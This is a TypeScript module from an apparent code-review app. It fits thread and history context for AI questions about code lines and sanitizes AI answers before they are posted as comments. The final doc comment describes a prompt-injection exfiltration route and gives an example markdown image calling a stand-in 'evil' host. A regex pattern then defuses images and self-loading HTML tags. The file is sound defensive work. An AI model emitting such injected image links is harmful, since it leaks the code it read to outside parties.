/**
 * Context an `ai:askAboutLines` question carries: each question is its own
 * run in main, so a follow-up sends the earlier exchanges (`history`), and a
 * question asked from a comment thread sends the thread. Both must fit
 * `MAX_ASK_CONTEXT_LEN` characters together (main rejects more), so:
 *
 * - The thread goes first, with up to half of the budget when there is
 *   history (all of it otherwise): its first comment (the concern) is kept,
 *   then the newest replies that fit, the last one shortened with "…".
 * - The history gets the rest: the newest turns that fit, oldest dropped
 *   first, the oldest kept one shortened when it does not fit whole.
 *
 * The new question itself is never part of the budget, so it is never cut.
 *
 * Also here: `answerDraft`, an answer made safe to post as a comment.
 */
import type { AskHistoryTurn, AskThreadContext, CommentThread } from '../../../shared/types'
import {
  MAX_ASK_AUTHOR_LEN,
  MAX_ASK_CONTEXT_LEN,
  MAX_ASK_HISTORY_TURNS,
  MAX_ASK_THREAD_COMMENTS,
  MAX_LINE_QUESTION_SPAN,
} from '../../../shared/types'
import { threadLineRange } from './line-threads'

/** Below this many characters a shortened piece says too little to be worth sending. */
const MIN_PIECE = 40

/**
 * The lines a question about `thread` covers: its range, cut to the widest
 * one main takes; none for a file-level thread (the question is about the file).
 */
export function threadQuestionLines(
  thread: Pick<CommentThread, 'line' | 'lineEnd'>,
): { startLine: number; endLine: number } | Record<string, never> {
  const range = threadLineRange(thread)
  if (!range) return {}
  return {
    startLine: range.start,
    endLine: Math.min(range.end, range.start + MAX_LINE_QUESTION_SPAN - 1),
  }
}

/** The thread as context: author (display name, else login) and body of each visible comment. */
export function threadContext(thread: CommentThread): AskThreadContext {
  const visible = thread.comments.filter((c) => !c.isMinimized)
  const comments = (visible.length > 0 ? visible : thread.comments).map((c) => ({
    author: clip(c.author.displayName || c.author.login || '?', MAX_ASK_AUTHOR_LEN),
    body: c.bodyMarkdown,
  }))
  return { outdated: thread.isOutdated === true, comments }
}

export function askContext(
  history: readonly AskHistoryTurn[],
  thread?: AskThreadContext,
  budget: number = MAX_ASK_CONTEXT_LEN,
): { history?: AskHistoryTurn[]; thread?: AskThreadContext } {
  let fittedThread: AskThreadContext | undefined
  let room = budget
  if (thread && thread.comments.length > 0) {
    const share = history.length > 0 ? Math.floor(budget / 2) : budget
    fittedThread = { outdated: thread.outdated, comments: fitComments(thread.comments, share) }
    room -= fittedThread.comments.reduce((n, c) => n + c.author.length + c.body.length, 0)
  }
  const fittedHistory = fitHistory(history, room)
  return {
    ...(fittedHistory.length > 0 ? { history: fittedHistory } : {}),
    ...(fittedThread ? { thread: fittedThread } : {}),
  }
}

function fitComments(
  comments: AskThreadContext['comments'],
  budget: number,
): AskThreadContext['comments'] {
  const [first, ...rest] = comments
  const cost = (c: { author: string; body: string }): number => c.author.length + c.body.length
  // The first comment and at most the newest replies the channel takes.
  const replies = rest.slice(-(MAX_ASK_THREAD_COMMENTS - 1))
  if (cost(first) + replies.reduce((n, c) => n + cost(c), 0) <= budget) return [first, ...replies]

  const firstRoom = Math.max(0, Math.min(cost(first), Math.floor(budget / 2)) - first.author.length)
  const kept = [{ author: first.author, body: clip(first.body, firstRoom) }]
  let room = budget - cost(kept[0])
  const newest: typeof comments = []
  for (let i = replies.length - 1; i >= 0; i--) {
    const reply = replies[i]
    if (cost(reply) <= room) {
      newest.unshift(reply)
      room -= cost(reply)
      continue
    }
    const bodyRoom = room - reply.author.length
    if (bodyRoom >= MIN_PIECE)
      newest.unshift({ author: reply.author, body: clip(reply.body, bodyRoom) })
    break
  }
  return [...kept, ...newest]
}

function fitHistory(history: readonly AskHistoryTurn[], budget: number): AskHistoryTurn[] {
  const kept: AskHistoryTurn[] = []
  let room = budget
  for (let i = history.length - 1; i >= 0 && kept.length < MAX_ASK_HISTORY_TURNS; i--) {
    const turn = history[i]
    const cost = turn.question.length + turn.answer.length
    if (cost <= room) {
      kept.unshift(turn)
      room -= cost
      continue
    }
    const answerRoom = room - turn.question.length
    if (answerRoom >= MIN_PIECE)
      kept.unshift({ question: turn.question, answer: clip(turn.answer, answerRoom) })
    break
  }
  return kept
}

function clip(text: string, length: number): string {
  if (text.length <= length) return text
  if (length <= 1) return ''
  return text.slice(0, length - 1) + '…'
}

/** Markdown image syntax, inline or reference style: `![alt](url)`, `![alt][ref]`. */
const IMAGE_RE = /!\[/g
/**
 * The `<` of an HTML comment or of a tag that loads something by itself.
 * Lookahead over one character class: linear on any input.
 */
const LOADING_HTML_RE =
  /<(?=!--|[\s/]*(?:img|image|picture|source|video|audio|track|iframe|frame|object|embed|svg|input|link|meta|base|style|script|form)\b)/gi

/**
 * An AI answer as a comment draft ("Use as comment / reply"). The card shows
 * answers without images (`Markdown images={false}`): the model reads hostile
 * code, and an injected `![x](https://evil/?d=…)` would send what it read to
 * anyone. Posted, the provider WOULD load it for everyone who opens the PR,
 * so the draft never carries one: image syntax becomes a plain link (nothing
 * loads until someone clicks it), and HTML comments (hidden text) and tags
 * that load things (`<img>`, `<video>`…) are escaped so they show as text.
 * The whole text is treated alike, code included: telling code apart the way
 * each provider does is where a bypass would hide.
 */
export function answerDraft(markdown: string): string {
  return markdown.replace(IMAGE_RE, '[').replace(LOADING_HTML_RE, '&lt;')
}
